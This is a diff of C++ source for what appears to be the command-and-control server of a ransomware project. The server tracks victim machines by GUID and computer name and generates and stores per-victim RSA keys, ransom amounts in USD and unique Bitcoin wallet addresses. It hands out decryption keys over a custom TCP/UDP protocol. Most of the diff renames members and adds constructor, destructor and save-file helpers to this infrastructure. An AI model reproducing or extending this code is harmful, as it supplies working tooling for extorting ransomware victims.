@@ -8,6 +8,28 @@
 #include <fstream>
 
 /**
+ * Create two server instances, one to represent TCP and another to represent UDP.
+ * 
+ * \param UDPPort - the port to listen for UDP messages on
+ * \param TCPPort - the port to make a TCP server on
+ */
+ServerInterface::ServerInterface(int UDPPort, int TCPPort) {
+	this->m_TCPServerDetails = NewServerInstance(TCP, TCPPort);
+	this->m_UDPServerDetails = NewServerInstance(UDP, UDPPort);
+}
+
+/**
+ * Check if a server is running if so, shut it down.
+ * Afterwords, clean up WSA.
+ */
+ServerInterface::~ServerInterface() {
+	if ( IsServerRunning(this->m_TCPServerDetails) )
+		ShutdownServer(TRUE);
+
+	CleanWSA();
+}
+
+/**
  * Generate a private and public RSA key using OpenSSL.
  * 
  * \return An RSAKeys struct with all fields filled out.
@@ -75,15 +97,15 @@ void ServerInterface::ListenForUDPMessages() {
 	std::cout << "Listening for udp messages\n";
 
 	// receive while udp server is alive
-	while ( this->UDPServerDetails.alive == TRUE ) {
+	while ( this->m_UDPServerDetails.alive == TRUE ) {
 		ClientRequest req = {};
 		sockaddr_in   incomingAddr;
-		BOOL		  received = NetCommon::ReceiveData(req, this->UDPServerDetails.sfd, UDP, incomingAddr);
+		BOOL		  received = NetCommon::ReceiveData(req, this->m_UDPServerDetails.sfd, UDP, incomingAddr);
 		if ( !received )
 			continue;
 
 		std::cout << "Received a message on the UDP socket." << std::endl;
-		PerformRequest(req, this->UDPServerDetails, -1, incomingAddr);
+		PerformRequest(req, this->m_UDPServerDetails, -1, incomingAddr);
 	}
 	std::cout << "Not receiving\n";
 }
@@ -97,12 +119,12 @@ void ServerInterface::ListenForUDPMessages() {
 BOOL ServerInterface::TCPSendMessageToAllClients(ServerCommand& req) {
 	BOOL success = FALSE;
 
-	ClientListMutex.lock();
+	m_ClientListMutex.lock();
 
-	for ( auto& clientInfo : this->ClientList )
+	for ( auto& clientInfo : this->m_ClientList )
 		success = TCPSendMessageToClient(clientInfo.first, req);
 
-	ClientListMutex.unlock();
+	m_ClientListMutex.unlock();
 
 	return success;
 }
@@ -137,7 +159,7 @@ JSON ServerInterface::ReadServerStateFile() {
  */
 Client* ServerInterface::GetClientSaveFile(long cuid) {
 	Client* client = GetClientPtr(cuid);
-	std::string machineGUID = client->MachineGUID;
+	std::string machineGUID = client->GetMachineGUID();
 
 	if ( !IsClientInSaveFile(machineGUID) )
 		return {};
@@ -150,9 +172,9 @@ Client* ServerInterface::GetClientSaveFile(long cuid) {
 
 	JSON JSONClientList = data["client_list"];
 	JSON JSONClientInfo = JSONClientList[machineGUID];
-	client->ComputerName    = JSONClientInfo["computer_name"];
+	client->SetDesktopName(JSONClientInfo["computer_name"]);
 	client->RansomAmountUSD = JSONClientInfo["ransom_payment_usd"];
-	client->MachineGUID     = JSONClientInfo["machine_guid"]; 
+	client->SetMachineGUID(JSONClientInfo["machine_guid"]); 
 
 	RSAKeys secrets;
 	macaron::Base64::Decode(JSONClientInfo["b64_rsa_public_key"], secrets.strPublicKey);
@@ -162,34 +184,34 @@ Client* ServerInterface::GetClientSaveFile(long cuid) {
 	client->SetEncryptionKeys(secrets);
 	client->UniqueBTCWalletAddress = JSONClientInfo["unique_btc_wallet"];
 
-	std::cout << "Imported Client from save file (" << client->MachineGUID << "/" << client->ComputerName << ")\n";
+	std::cout << "Imported Client from save file (" << client->GetMachineGUID() << "/" << client->GetDesktopName() << ")\n";
 
 	return client;
 }
 
 /**
- * Save information about this->TCPServerDetails to a file stored on the servers machine as JSON.
+ * Save information about this->m_TCPServerDetails to a file stored on the servers machine as JSON.
  * 
  * \return TRUE if no errors occured.
  */
 BOOL ServerInterface::SaveServerState() {
-	ClientListMutex.lock();
+	m_ClientListMutex.lock();
 
 	std::cout << "Saving server state\n";
 
 	JSON data = ReadServerStateFile();
 	data["server_state"] = {
-		{"clients",  this->ClientList.size()},
-		{"udp_port", this->UDPServerDetails.port},
-		{"tcp_port", this->TCPServerDetails.port},
+		{"clients",  this->m_ClientList.size()},
+		{"udp_port", this->m_UDPServerDetails.port},
+		{"tcp_port", this->m_TCPServerDetails.port},
 		{"tcp_dns",  DNS_NAME},
 	};
 	
-	for ( auto& iter : this->ClientList ) {
+	for ( auto& iter : this->m_ClientList ) {
 		Client client = iter.second;
-		data["client_list"][client.MachineGUID] = {
-			{ "computer_name", client.ComputerName },
-			{ "machine_guid", client.MachineGUID },
+		data["client_list"][client.GetMachineGUID()] = {
+			{ "computer_name", client.GetDesktopName()},
+			{ "machine_guid", client.GetMachineGUID()},
 			{ "client_id", client.ClientUID },
 			{ "unique_btc_wallet", client.UniqueBTCWalletAddress },
 			{ "ransom_payment_usd", client.RansomAmountUSD },
@@ -204,17 +226,17 @@ BOOL ServerInterface::SaveServerState() {
 	outFile << std::setw(4) << data << std::endl;
 	outFile.close();
 
-	ClientListMutex.unlock();
+	m_ClientListMutex.unlock();
 	return TRUE;
 }
 
 void ServerInterface::ShutdownServer(BOOL confirm) {
 	if ( !confirm ) return;
 
-	this->TCPServerDetails.alive = FALSE;
-	ShutdownSocket(this->TCPServerDetails.sfd, 2); // shutdown server socket for both read and write
-	CloseSocket(this->TCPServerDetails.sfd);
-	this->TCPServerDetails = {}; // set server details to new blank server structure
+	this->m_TCPServerDetails.alive = FALSE;
+	ShutdownSocket(this->m_TCPServerDetails.sfd, 2); // shutdown server socket for both read and write
+	CloseSocket(this->m_TCPServerDetails.sfd);
+	this->m_TCPServerDetails = {}; // set server details to new blank server structure
 }
 
 /**
@@ -238,12 +260,12 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 		TCPClient = GetClientPtr(cuid);
 
 	std::cout << "Received a request.\n - Performing Action : " << req.action << std::endl;
-	if ( TCPClient ) std::cout << " - From: " << TCPClient->ComputerName << std::endl;
+	if ( TCPClient ) std::cout << " - From: " << TCPClient->GetDesktopName() << std::endl;
 
 	switch ( req.action )
 	{
 	// connect client to tcp server on udp request
-	case ClientRequest::CONNECT_CLIENT: 
+	case ClientRequest::kConnectClient: 
 	{
 		if ( onTCP ) // already connected
 			break;
@@ -255,7 +277,7 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 
 		// server with ip inserted into addr for the client to connect to
 		// allows me to change the dns name to whatever i want, whenever
-		Server temp = this->TCPServerDetails;
+		Server temp = this->m_TCPServerDetails;
 		memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);
 
 		UDPMessage response(temp);
@@ -264,7 +286,7 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 
 		break;
 	}
-	case ClientMessage::REQUEST_PRIVATE_ENCRYPTION_KEY: 
+	case ClientMessage::kRequestPrivateEncryptionKey: 
 	{
 		// tcp only command
 		if ( !onTCP ) 
@@ -276,21 +298,21 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 		//}
 		std::cout << "Client wants this decryption key " << TCPClient->GetSecrets().strPrivateKey << std::endl;
 
-		ServerCommand reply(RemoteAction::RETURN_PRIVATE_RSA_KEY, {}, "", "", TCPClient->GetSecrets().strPrivateKey);
+		ServerCommand reply(RemoteAction::kReturnPrivateRSAKey, {}, "", "", TCPClient->GetSecrets().strPrivateKey);
 		success = TCPSendMessageToClient(cuid, reply);
 
 		break;
 	}
-	case ClientMessage::REQUEST_PUBLIC_ENCRYPTION_KEY:
+	case ClientMessage::kRequestPublicEncryptionKey:
 		if ( !onTCP )
 			break;
 		success = SendTCPClientRSAPublicKey(cuid, TCPClient->GetSecrets().bioPublicKey);
 		break;
-	case ClientMessage::REQUEST_RANSOM_BTC_ADDRESS:
+	case ClientMessage::kRequestRansomBTCAddress:
 		if ( !onTCP )
 			break;
 		break;
-	case ClientMessage::VALIDATE_RANSOM_PAYMENT:
+	case ClientMessage::kValidateRansomPayment:
 		if ( !onTCP )
 			break;
 		break;
@@ -308,22 +330,22 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 	if ( client == nullptr )
 		return;
 
-	std::cout << "New thread created to receive messages from client " << client->ComputerName << std::endl;
+	std::cout << "New thread created to receive messages from client " << client->GetDesktopName() << std::endl;
 	BOOL receiving = TRUE;
 
 	// initial request to send rsa keys before we can start encrypted communication
 	// use tcp server because udp is prone to not sending the keys fully
 	{
 		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP));
-		PerformRequest(receivedData, this->TCPServerDetails, cuid);
+		PerformRequest(receivedData, this->m_TCPServerDetails, cuid);
 	}
 
-	if ( client->ComputerName == "unknown" )
+	if ( client->GetMachineGUID() == "unknown" )
 		GetClientComputerName(cuid);
-	if ( client->MachineGUID == "unknown" )
+	if ( client->GetMachineGUID() == "unknown" )
 		GetClientMachineGUID(cuid);
 
-	if ( IsClientInSaveFile(client->MachineGUID) ) {
+	if ( IsClientInSaveFile(client->GetMachineGUID()) ) {
 		GetClientSaveFile(client->ClientUID);
 	}
 
@@ -339,7 +361,7 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 		if ( client->ExpectingResponse ) {
 			std::cout << "expecting response\n";
 			client->LastClientResponse = client->RecentClientResponse;
-			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(this->TCPServerDetails.sfd, TRUE, client->GetSecrets().bioPrivateKey);
+			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(this->m_TCPServerDetails.sfd, TRUE, client->GetSecrets().bioPrivateKey);
 			continue;
 		}
 
@@ -347,10 +369,10 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->GetSocket(TCP), TRUE, client->GetSecrets().bioPrivateKey);
 		receiving = receivedData.valid;
 
-		std::cout << "Client name: " << client->ComputerName << std::endl;
+		std::cout << "Client name: " << client->GetMachineGUID() << std::endl;
 		std::cout << "Most recent request: " << receivedData.action << std::endl;
 
-		PerformRequest(receivedData, this->TCPServerDetails, cuid);
+		PerformRequest(receivedData, this->m_TCPServerDetails, cuid);
 	} while ( receiving );
 }
 
@@ -382,18 +404,18 @@ BOOL ServerInterface::SendTCPClientRSAPublicKey(long cuid, BIO* pubKey) {
  * 
  */
 void ServerInterface::AcceptTCPConnections() {
-	if ( this->TCPServerDetails.accepting ) // already accepting connections
+	if ( this->m_TCPServerDetails.accepting ) // already accepting connections
 		return;
 
-	this->TCPServerDetails.accepting = TRUE;
+	this->m_TCPServerDetails.accepting = TRUE;
 
-	while ( this->ClientList.size() < MAX_CON && this->TCPServerDetails.alive == TRUE )
+	while ( this->m_ClientList.size() < MAX_CON && this->m_TCPServerDetails.alive == TRUE )
 	{
 		// accept
 		sockaddr_in addr = {};
 		int size = sizeof(sockaddr_in);
 		
-		SOCKET clientSocket = AcceptOnSocket(this->TCPServerDetails.sfd, reinterpret_cast<sockaddr*>( &addr ), &size);
+		SOCKET clientSocket = AcceptOnSocket(this->m_TCPServerDetails.sfd, reinterpret_cast<sockaddr*>( &addr ), &size);
 		if ( clientSocket == INVALID_SOCKET )
 			continue;
 
@@ -415,7 +437,7 @@ void ServerInterface::AcceptTCPConnections() {
 	}
 
 	// stopped accepting connections. this function is now done.
-	this->TCPServerDetails.accepting = FALSE;
+	this->m_TCPServerDetails.accepting = FALSE;
 }
 
 /**
@@ -434,8 +456,8 @@ BOOL ServerInterface::GetClientMachineGUID(long cuid) {
 
 	BYTESTRING decrypted = NetCommon::RSADecryptStruct(machienGUID, client->GetSecrets().bioPrivateKey, TRUE);
 	std::string machineGuid = Serialization::BytestringToString(decrypted);
-	client->MachineGUID = machineGuid;
-	std::cout << "Got machine GUID: " << client->MachineGUID << std::endl;
+	client->SetMachineGUID(machineGuid);
+	std::cout << "Got machine GUID: " << client->GetMachineGUID() << std::endl;
 	return TRUE;
 }
 
@@ -455,8 +477,8 @@ BOOL ServerInterface::GetClientComputerName(long cuid) {
 
 	BYTESTRING decrypted = NetCommon::RSADecryptStruct(computerNameSerialized, client->GetSecrets().bioPrivateKey, TRUE);
 	std::string computerName = Serialization::BytestringToString(decrypted);
-	client->ComputerName = computerName.c_str();
-	std::cout << "Got client computer naem: " << client->ComputerName << std::endl;
+	client->SetDesktopName(computerName);
+	std::cout << "Got client computer naem: " << client->GetDesktopName() << std::endl;
 
 	return TRUE;
 }
@@ -530,7 +552,7 @@ BOOL ServerInterface::StartServer(Server& server) {
 		if ( status == SOCKET_ERROR )
 			return FALSE;
 
-		this->TCPServerDetails = server;
+		this->m_TCPServerDetails = server;
 
 		// start accepting
 		std::thread acceptThread(&ServerInterface::AcceptTCPConnections, this);
@@ -538,7 +560,7 @@ BOOL ServerInterface::StartServer(Server& server) {
 	}
 	// otherwise if not tcp server then listen for udp messaages
 	else if ( server.type == SOCK_DGRAM ) {
-		this->UDPServerDetails = server;
+		this->m_UDPServerDetails = server;
 
 		std::thread receiveThread(&ServerInterface::ListenForUDPMessages, this);
 		receiveThread.detach();
@@ -590,7 +612,7 @@ ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
  * \return TRUE or FALSE depending if the message was sent or not
  */
 BOOL ServerInterface::UDPSendMessageToClient(Client clientInfo, UDPMessage& message) {
-	return NetCommon::TransmitData(message, this->UDPServerDetails.sfd, UDP, clientInfo.GetAddressInfo());
+	return NetCommon::TransmitData(message, this->m_UDPServerDetails.sfd, UDP, clientInfo.GetAddressInfo());
 }
 
 /**
@@ -601,7 +623,7 @@ BOOL ServerInterface::UDPSendMessageToClient(Client clientInfo, UDPMessage& mess
  */
 Client* ServerInterface::GetClientPtr(long cuid) {
 	if ( !ClientIsInClientList(cuid) ) return nullptr;
-	return &this->ClientList.at(cuid);
+	return &this->m_ClientList.at(cuid);
 }
 
 /**
@@ -610,8 +632,22 @@ Client* ServerInterface::GetClientPtr(long cuid) {
  * \return this->ClientList
  */
 std::unordered_map<long, Client>& ServerInterface::GetClientList() {
-	std::lock_guard<std::mutex> lock(ClientListMutex);
-	return this->ClientList;
+	std::lock_guard<std::mutex> lock(m_ClientListMutex);
+	return this->m_ClientList;
+}
+
+/**
+ * Check if a client's machine guid is in the server save file client list.
+ * 
+ * \param machineGUID - the machine GUID to try and find
+ * \return TRUE or FALSE whether or not the machine guid is found in the file
+ */
+BOOL ServerInterface::IsClientInSaveFile(std::string machineGUID) {
+	JSON file = ReadServerStateFile();
+	if ( !file.empty() && file.contains("client_list") )
+		return file["client_list"].contains(machineGUID);
+
+	return FALSE;
 }
 
 /**
@@ -631,7 +667,7 @@ ClientResponse ServerInterface::PingClient(long cuid) {
 
 	// send the ping to the client over tcp
 	ServerCommand pingCommand;
-	pingCommand.action = RemoteAction::PING_CLIENT;
+	pingCommand.action = RemoteAction::kPingClient;
 	pingCommand.valid = TRUE;
 	
 	BOOL sent = TCPSendMessageToClient(cuid, pingCommand);
@@ -679,10 +715,10 @@ BOOL ServerInterface::ClientIsInClientList(long cuid) {
 BOOL ServerInterface::AddToClientList(Client client) {
 	std::cout << "Adding client to list\n";
 	
-	ClientListMutex.lock();	
-	this->ClientList.insert(std::make_pair(client.ClientUID, client));
+	m_ClientListMutex.lock();	
+	this->m_ClientList.insert(std::make_pair(client.ClientUID, client));
 	 
-	ClientListMutex.unlock();
+	m_ClientListMutex.unlock();
 	
 	return TRUE;
 }
